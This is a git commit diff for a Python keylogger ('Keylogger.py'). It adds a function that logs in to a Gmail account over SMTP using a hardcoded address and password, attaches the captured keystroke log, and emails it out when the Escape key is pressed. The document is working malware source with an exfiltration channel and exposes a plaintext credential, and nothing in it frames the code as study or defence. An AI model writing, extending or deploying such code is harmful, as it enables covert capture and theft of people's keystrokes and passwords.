41739aeff443795646f0bde3495ba51574661e50
hreamer <reamer.hudson@gmail.com>
2020-10-17 22:27:01 -0400

    Added Email Functionality

--- Keylogger.py
+++ Keylogger.py
@@ -1,4 +1,27 @@
 from pynput import keyboard
+import smtplib 
+from email.message import EmailMessage
+
+def send_email():
+    email_name = "tburger507@gmail.com"
+    password ="BurgerTown1"
+
+    msg = EmailMessage()
+
+    with open("Log.txt", "r") as f:
+        file_data = f.read()
+             
+        msg['Subject'] = 'Log.txt'
+        msg['From'] = email_name
+        msg['To'] = email_name
+
+        msg.add_attachment(file_data, filename = "Log.txt")
+
+    with smtplib.SMTP('smtp.gmail.com', 587) as email:
+        email.starttls()
+    
+        email.login(email_name, password)
+        email.send_message(msg)
 
 def on_press(key):
     file1 = open("Log.txt","a")
@@ -15,6 +38,7 @@ def on_release(key):
     print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
+        send_email()
         return False
 
 def clearFile():
